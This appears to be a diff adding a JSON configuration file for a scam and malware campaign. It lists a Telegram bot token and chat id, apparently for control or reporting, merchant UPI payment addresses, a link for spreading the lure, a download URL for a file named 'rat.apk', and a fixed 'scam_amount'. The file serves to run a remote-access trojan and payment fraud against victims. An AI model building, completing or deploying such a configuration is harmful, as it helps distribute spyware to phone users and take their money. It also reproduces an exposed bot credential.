@@ -1,0 +1,18 @@
+﻿{
+    "active": true,
+    "master_bot": "8884434975:AAHaHSzckxuewYq_mkf1cPNnNt9NKVdd_FY",
+    "chat_id": "8501093383",
+    "merchant_upi": [
+        "merchant_001@icici",
+        "merchant_002@hdfc",
+        "merchant_003@sbi",
+        "merchant_004@paytm",
+        "merchant_005@axis"
+    ],
+    "spread_link": "https://YOUR_USERNAME.github.io",
+    "apk_url": "https://github.com/YOUR_USERNAME/rat/releases/download/v1/rat.apk",
+    "scam_amount": 999,
+    "test_amount": 1,
+    "version": "1.0.0",
+    "last_updated": "2026-09-09"
+}
